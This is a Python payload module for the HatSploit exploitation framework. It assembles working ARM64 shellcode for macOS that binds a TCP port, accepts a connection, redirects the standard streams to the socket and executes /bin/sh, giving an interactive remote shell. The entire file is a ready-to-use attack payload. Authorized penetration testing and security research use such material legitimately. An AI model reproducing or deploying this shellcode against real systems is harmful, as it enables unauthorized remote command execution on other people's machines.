"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *
from hatsploit.lib.core.payload.macos import MacOS


class HatSploitPayload(Payload, Handler, MacOS):
    def __init__(self):
        super().__init__({
            'Name': "macOS aarch64 Shell Bind TCP",
            'Payload': "macos/aarch64/shell_bind_tcp",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': """
                This payload creates an interactive bind TCP shell for macOS
                with aarch64 (M1, M2, M3, etc.) architecture.
            """,
            'Arch': ARCH_AARCH64,
            'Platform': OS_MACOS,
            'Type': BIND_TCP,
        })

    def implant(self):
        return self.__asm__(
            """
            start:
                mov x1, 2
                mov x0, x12
                mov x16, 0x5a
                svc 0

                mov x1, 1
                mov x0, x12
                svc 0

                mov x2, 0
                mov x0, x12
                svc 0

                adr x0, path
                mov x1, xzr
                mov x2, xzr
                mov x16, 0x3b
                svc 0

            path:
                .asciz "/bin/sh"
            """
        )

    def run(self):
        return self.__asm__(
            f"""
            bl start

            addr:
                .short 0x2
                .short 0x{self.rport.little.hex()}
                .word 0x0

            start:
                mov x0, 2
                mov x1, 1
                mov x2, 0
                mov x16, 0x61
                svc 0

                mov x12, x0
                adr x1, addr
                mov x2, 16
                mov x16, 0x68
                svc 0

                mov x0, x12
                mov x1, 2
                mov x16, 0x6a
                svc 0

                mov x0, x12
                eor x1, x1, x1
                eor x2, x2, x2
                mov x16, 0x1e
                svc 0

                mov x12, x0
            """
        ) + self.implant()
